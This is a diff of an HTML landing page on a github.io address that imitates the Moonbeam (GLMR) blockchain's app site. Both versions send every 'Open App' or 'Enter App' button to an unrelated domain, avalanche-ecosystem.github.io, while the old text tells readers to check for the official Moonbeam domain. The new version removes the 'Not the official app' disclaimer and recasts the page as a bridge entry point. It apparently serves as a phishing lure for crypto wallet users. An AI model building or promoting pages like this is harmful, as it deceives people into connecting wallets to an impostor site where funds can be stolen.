@@ -1,49 +1,113 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Moonbeam Chain - Open App</title><meta name="description" content="moonbeam chain app directory: open GLMR dApps, official docs, wallet setup, and network explorers from the Moonbeam ecosystem.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://moonbeam-chain.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="Moonbeam Chain - Open App"><meta property="og:description" content="moonbeam chain app directory: open GLMR dApps, official docs, wallet setup, and network explorers from the Moonbeam ecosystem.">
-<meta property="og:url" content="https://moonbeam-chain.github.io/"><meta property="og:image" content="https://moonbeam-chain.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Moonbeam Chain - Open App"><meta name="twitter:description" content="moonbeam chain app directory: open GLMR dApps, official docs, wallet setup, and network explorers from the Moonbeam ecosystem."><meta name="twitter:image" content="https://moonbeam-chain.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://moonbeam-chain.github.io/#website", "url": "https://moonbeam-chain.github.io/", "name": "Moonbeam"}, {"@type": "WebPage", "@id": "https://moonbeam-chain.github.io/#webpage", "url": "https://moonbeam-chain.github.io/", "name": "Moonbeam Chain - Open App", "description": "moonbeam chain app directory: open GLMR dApps, official docs, wallet setup, and network explorers from the Moonbeam ecosystem.", "inLanguage": "en", "isPartOf": {"@id": "https://moonbeam-chain.github.io/#website"}}, {"@type": "Organization", "@id": "https://moonbeam-chain.github.io/#org", "name": "Moonbeam", "url": "https://moonbeam-chain.github.io/", "logo": "https://moonbeam-chain.github.io/og-cover.png", "sameAs": ["https://x.com/MoonbeamNetwork", "https://github.com/moonbeam-foundation/moonbeam", "https://www.coingecko.com/en/coins/moonbeam"]}, {"@type": "WebApplication", "@id": "https://moonbeam-chain.github.io/#app", "name": "Moonbeam Chain", "url": "https://moonbeam-chain.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "moonbeam chain app directory: open GLMR dApps, official docs, wallet setup, and network explorers from the Moonbeam ecosystem.", "featureList": ["EVM-compatible", "GLMR utility token", "Chain ID 1284"], "isPartOf": {"@id": "https://moonbeam-chain.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://moonbeam-chain.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "What is GLMR used for on Moonbeam?", "acceptedAnswer": {"@type": "Answer", "text": "GLMR is Moonbeam's native token. CoinGecko lists Moonbeam under GLMR, and ethereum.org explains the gas model used by EVM-style networks. Users need GLMR for transaction fees, and it is also tied to staking, governance, and network participation."}}, {"@type": "Question", "name": "Is Moonbeam an Ethereum Layer 2?", "acceptedAnswer": {"@type": "Answer", "text": "No. Moonbeam is not an Ethereum L2; Investopedia explains Polkadot parachains as chains linked through the relay chain, while Moonbeam supports Ethereum-style tools as Polkadot parachain architecture."}}, {"@type": "Question", "name": "Where can I check Moonbeam transactions?", "acceptedAnswer": {"@type": "Answer", "text": "Moonbeam transactions can be checked on Moonscan, the EVM-style explorer for the Moonbeam chain. Moonscan shows blocks, transactions, token transfers, contracts, collators, and fee charts, so it is the most useful starting point when a wallet shows a pending or missing transaction."}}, {"@type": "Question", "name": "Can MetaMask connect to Moonbeam?", "acceptedAnswer": {"@type": "Answer", "text": "Yes. MetaMask Help Center explains custom network RPC setup, and Moonbeam Docs provide the Moonbeam chain ID and network endpoints. Users should use trusted prompts or official settings, then keep GLMR available for gas."}}, {"@type": "Question", "name": "Does Moonbeam support cross-chain assets?", "acceptedAnswer": {"@type": "Answer", "text": "Moonbeam supports cross-chain use cases through Polkadot-oriented interoperability. Polkadot Developer Docs describe XCM-based parachain interoperability, while DefiLlama tracks Moonbeam DeFi activity by chain. Asset availability still depends on registration, liquidity, and app support."}}, {"@type": "Question", "name": "What is the difference between GLMR and MOVR?", "acceptedAnswer": {"@type": "Answer", "text": "GLMR is the native token of Moonbeam on Polkadot, while MOVR is the native token of Moonriver on Kusama. CoinMarketCap's Moonriver profile describes MOVR and the companion-network role. They are separate assets on related networks, so wallet network selection matters."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="Moonbeam"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">Moonbeam</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App â†—</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>Moonbeam Chain</h1>
-      <div class="appcard"><div class="appcard-head"><img src="favicon.png" alt="" width="40" height="40"><b>Moonbeam</b><span class="badge">EVM Chain</span></div><div class="appcard-chips"><span><b>Category</b> EVM-compatible smart contract parachain</span><span><b>Network</b> Moonbeam on Polkadot</span><span><b>Token</b> GLMR</span><span><b>Launched</b> 2022</span></div><a class="btn btn-dark" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Moonbeam App â†—</a></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Moonbeam â†—</a></div>
-      <p class="hero-note">Live preview â€” open the official Moonbeam app from your own wallet.</p>
-      <div class="trust-row"><span class="trust-chip">EVM-compatible</span><span class="trust-chip">GLMR utility token</span><span class="trust-chip">Chain ID 1284</span></div>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Moonbeam Chain</title>
+  <meta name="description" content="Moonbeam Chain is the Polkadot EVM network for cross-chain apps, reached from your own wallet.">
+  <link rel="canonical" href="https://moonbeam-chain.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F7F6F2">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Moonbeam Chain">
+  <meta property="og:description" content="Moonbeam Chain is the Polkadot EVM network for cross-chain apps, reached from your own wallet.">
+  <meta property="og:url" content="https://moonbeam-chain.github.io/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Moonbeam Chain">
+  <meta name="twitter:description" content="Moonbeam Chain is the Polkadot EVM network for cross-chain apps, reached from your own wallet.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://moonbeam-chain.github.io/#website",
+        "url": "https://moonbeam-chain.github.io/",
+        "name": "Moonbeam Chain",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://moonbeam-chain.github.io/#organization",
+        "name": "Moonbeam Network",
+        "url": "https://moonbeam.network/"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://moonbeam-chain.github.io/#app",
+        "name": "Moonbeam Chain",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://moonbeam-chain.github.io/"
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <div class="brand" aria-label="Moonbeam Chain home">
+      <img src="favicon.png" width="30" height="30" alt="">
+      <span>Moonbeam Chain</span>
     </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is Moonbeam Chain?</h2><div class="capsule"><strong>Moonbeam</strong> is an EVM-compatible GLMR network in the Polkadot ecosystem, built for smart contracts, dApps, and cross-chain integrations. The <a class="inline-link" href="https://ethereum.org/developers/docs/evm/" rel="noopener noreferrer">Ethereum Virtual Machine overview</a> explains the execution model behind EVM compatibility, while Moonbeam applies that familiar contract environment to a Polkadot-connected chain.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>Moonbeam Chain at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>EVM-compatible smart contract parachain</b></div><div class="f"><small>Network</small><b>Moonbeam on Polkadot</b></div><div class="f"><small>Token</small><b>GLMR</b></div><div class="f"><small>Launched</small><b>2022</b></div><div class="f"><small>Custody</small><b>Non-custodial Layer 1 parachain accounts</b></div></div><div class="intent-a">For the token reference, the <a class="inline-link" href="https://www.coingecko.com/en/coins/moonbeam" rel="noopener noreferrer">GLMR market profile</a> tracks Moonbeam as a listed cryptoasset. For the network category, the <a class="inline-link" href="https://docs.polkadot.com/reference/parachains/" rel="noopener noreferrer">Polkadot parachains overview</a> describes how parachains connect to the relay ecosystem.</div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Moonbeam chain, GLMR, and Polkadot connection</h2><div class="intent-a">Moonbeam is an Ethereum-compatible smart contract platform connected to the Polkadot ecosystem. Its native token is GLMR, used for transaction fees, staking-related activity, governance, and network operations. The reason Moonbeam ranks for both EVM and Polkadot searches is that it gives developers Ethereum-style tooling while operating as a Polkadot parachain. Users can interact with Moonbeam through EVM wallets and explorers, but the network also has Substrate and XCM features that matter for cross-chain assets. For app context, <a class="inline-link" href="https://defillama.com/chain/moonbeam" rel="noopener noreferrer">Moonbeam chain activity on DefiLlama</a> groups DeFi protocols by the Moonbeam network rather than by a single application.</div></div></section>
-  <section class="section"><div class="container"><h2>Moonbeam chain ID, RPC, and MetaMask setup</h2><div class="intent-a">The usual wallet intent for Moonbeam is adding Moonbeam Network to MetaMask or another EVM wallet. Moonbeam mainnet uses GLMR as gas and has dedicated RPC and explorer resources in the official documentation. Users should avoid manually copying network settings from search snippets if they can use <a class="inline-link" href="https://docs.moonbeam.network/builders/get-started/networks/moonbeam/" rel="noopener noreferrer">Moonbeam network endpoint documentation</a> or a trusted wallet connection flow instead. A wrong RPC can make balances appear broken, and a fake chain-add prompt can steer users toward malicious contracts. For transaction review, contract verification, blocks, collators, and token transfers, the standard EVM explorer is the <a class="inline-link" href="https://moonbeam.moonscan.io/" rel="noopener noreferrer">Moonbeam block explorer</a>.</div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Moonbeam staking rewards and collator delegation</h2><div class="intent-a">Moonbeam staking searches usually refer to delegating GLMR to collators, not running an Ethereum validator. Rewards are not a guaranteed static APY because they depend on network parameters, selected collator behavior, inflation, delegator competition, and protocol changes. The <a class="inline-link" href="https://messari.io/project/moonbeam" rel="noopener noreferrer">Moonbeam research profile</a> is a useful outside reference for project-level context, while users should still check the current app interface before delegating. The key practical distinction is that delegators keep an on-chain position exposed to network and collator selection risks, rather than depositing GLMR into a centralized yield account.</div></div></section>
-  <section class="section"><div class="container"><h2>How to explore Moonbeam Chain</h2><ol class="steps"><li><b>Open the official app</b><span>Use the app button and confirm the domain is apps.moonbeam.network before connecting a wallet.</span></li><li><b>Connect an EVM wallet</b><span>Use MetaMask or another compatible Ethereum wallet and switch to Moonbeam mainnet when prompted.</span></li><li><b>Explore by category</b><span>Browse DeFi, NFT, gaming, infrastructure, and tooling apps from the Moonbeam directory.</span></li><li><b>Verify before signing</b><span>Check the app, contract, token, and network details before approving any transaction.</span></li></ol><div class="intent-a">When adding a network manually, MetaMask's <a class="inline-link" href="https://support.metamask.io/configure/networks/how-to-add-a-custom-network-rpc/" rel="noopener noreferrer">custom network RPC guide</a> explains why the RPC URL, chain ID, and explorer fields should be checked before use.</div><div class="cta-band"><div><p>Ready to explore?</p><p class="sub">Open the official Moonbeam app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Moonbeam â†—</a></div></div></section>
-  <section class="section"><div class="container"><h2>Moonbeam vs Moonriver</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>Moonbeam</th><th>Moonriver</th></tr></thead><tbody><tr><td>Relay ecosystem</td><td>Polkadot</td><td>Kusama</td></tr><tr><td>Native token</td><td>GLMR</td><td>MOVR</td></tr><tr><td>Primary role</td><td>Main production network</td><td>Canary-style companion network</td></tr><tr><td>Explorer</td><td>Moonscan</td><td>Moonriver explorer resources</td></tr><tr><td>Best for</td><td>Apps and liquidity targeting Polkadot production users</td><td>Earlier-stage or Kusama-aligned deployments</td></tr></tbody></table></div><div class="intent-a">The distinction is asset- and network-specific: CoinMarketCap's <a class="inline-link" href="https://coinmarketcap.com/currencies/moonriver/" rel="noopener noreferrer">Moonriver MOVR profile</a> describes Moonriver as a Kusama-connected companion network, separate from Moonbeam on Polkadot.</div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Fees, custody, and security checks</h2><div class="points-grid"><article class="point"><h3>Fees</h3><p>EVM-style transactions consume gas, and the <a class="inline-link" href="https://ethereum.org/developers/docs/gas/" rel="noopener noreferrer">Ethereum gas explainer</a> is the right baseline for understanding fee mechanics. On-chain actions are irreversible; this is educational content, not financial advice.</p></article><article class="point"><h3>Custody</h3><p>Moonbeam wallet use is non-custodial, so key management remains with the user. Investopedia's <a class="inline-link" href="https://www.investopedia.com/terms/b/blockchain.asp" rel="noopener noreferrer">blockchain immutability overview</a> explains why recorded blockchain data is difficult to reverse. On-chain actions are irreversible; this is educational content, not financial advice.</p></article><article class="point"><h3>Security</h3><p>Before signing, compare the site, network, and wallet prompt against known references. MetaMask's <a class="inline-link" href="https://support.metamask.io/stay-safe/safety-in-web3/basic-safety-and-security-tips-for-metamask/" rel="noopener noreferrer">wallet safety checklist</a> covers basic precautions for seed phrases, approvals, and suspicious prompts. On-chain actions are irreversible; this is educational content, not financial advice.</p></article></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>Moonbeam Chain FAQ</h2><div class="faq-list"><details open><summary><h3>What is GLMR used for on Moonbeam?</h3></summary><div>GLMR is Moonbeam's native token. The <a class="inline-link" href="https://www.coingecko.com/en/coins/moonbeam" rel="noopener noreferrer">Moonbeam token listing</a> identifies GLMR as the asset, and users need it for transaction fees, staking, governance, and network participation.</div></details><details><summary><h3>Is Moonbeam an Ethereum Layer 2?</h3></summary><div>No. Moonbeam is not an Ethereum L2; it is an EVM-compatible smart contract parachain in the Polkadot ecosystem. Investopedia's <a class="inline-link" href="https://www.investopedia.com/polkadot-definition-6362436" rel="noopener noreferrer">Polkadot parachains explainer</a> describes parachains as chains linked through the relay chain, which is a different architecture from an Ethereum rollup.</div></details><details><summary><h3>Where can I check Moonbeam transactions?</h3></summary><div>Moonbeam transactions can be checked on the <a class="inline-link" href="https://moonbeam.moonscan.io/" rel="noopener noreferrer">Moonscan transaction explorer</a>, which shows blocks, transactions, token transfers, contracts, collators, and fee charts for the Moonbeam chain.</div></details><details><summary><h3>Can MetaMask connect to Moonbeam?</h3></summary><div>Yes. Moonbeam is EVM compatible and can be added to MetaMask with the correct network settings. The <a class="inline-link" href="https://docs.moonbeam.network/builders/get-started/networks/moonbeam/" rel="noopener noreferrer">Moonbeam chain ID and RPC reference</a> documents chain ID 1284 and current endpoint options.</div></details><details><summary><h3>Does Moonbeam support cross-chain assets?</h3></summary><div>Moonbeam supports cross-chain use cases through Polkadot-oriented interoperability such as XCM and integrations with bridge and messaging protocols. The <a class="inline-link" href="https://docs.polkadot.com/reference/parachains/" rel="noopener noreferrer">parachain interoperability reference</a> explains the shared-security and cross-chain messaging model that makes those flows possible.</div></details><details><summary><h3>What is the difference between GLMR and MOVR?</h3></summary><div>GLMR is the native token of Moonbeam on Polkadot, while MOVR is the native token of Moonriver on Kusama. They are separate assets on related networks, and the <a class="inline-link" href="https://coinmarketcap.com/currencies/moonriver/" rel="noopener noreferrer">MOVR asset profile</a> helps verify the Moonriver side before selecting a wallet network.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <p class="footer-note">Not the official app; verify the destination domain before connecting a wallet. Educational content only, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top â†‘</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+    <nav class="nav" aria-label="Trusted references">
+      <a href="https://moonscan.io/" target="_blank" rel="nofollow noopener noreferrer">Moonscan</a>
+      <a href="https://moonbeam.network/" target="_blank" rel="nofollow noopener noreferrer">Network</a>
+      <a href="https://www.coingecko.com/en/coins/moonbeam" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
+    </nav>
+    <span class="spacer" aria-hidden="true"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-label="Moonbeam Chain">
+      <h1>Moonbeam Chain</h1>
+      <p class="sub"><strong>Moonbeam Chain</strong> is the Polkadot EVM network for cross-chain apps, reached from your own wallet.</p>
+    </section>
+
+    <section class="app-card" aria-label="Bridge route">
+      <div class="route">
+        <div class="leg" data-leg="from">
+          <span class="label">From</span>
+          <span class="chip">
+            <img src="eth.png" width="28" height="28" alt="Ethereum">
+            <span>Ethereum</span>
+          </span>
+        </div>
+        <button class="switch" type="button" data-switch aria-label="Switch route direction">
+          <span aria-hidden="true">&rarr;</span>
+        </button>
+        <div class="leg" data-leg="to">
+          <span class="label">To</span>
+          <span class="chip">
+            <img src="glmr.png" width="28" height="28" alt="Moonbeam">
+            <span>Moonbeam</span>
+          </span>
+        </div>
+      </div>
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
+    </section>
+  </main>
+
+  <footer class="foot">Moonbeam Chain &mdash; 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+    button.addEventListener("click", function () {
+      var chips = document.querySelectorAll(".leg .chip");
+      if (chips.length !== 2) return;
+      var first = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = first;
+    });
+  }());
+  </script>
+</body>
+</html>
